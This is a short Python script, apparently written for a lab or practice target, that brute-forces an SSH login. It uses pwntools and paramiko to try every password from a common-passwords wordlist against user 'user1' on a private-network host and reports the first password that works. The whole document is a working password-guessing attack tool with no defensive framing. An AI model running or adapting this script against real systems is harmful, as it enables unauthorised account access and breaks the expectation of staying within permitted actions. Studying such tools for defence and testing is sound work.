#!/usr/bin/env python3
#Author: Bill Burn

import click
import paramiko
from pwn import *

click.clear()

host = "192.168.10.13"
username = 'user1'
attempts = 0

with open("common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1)
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1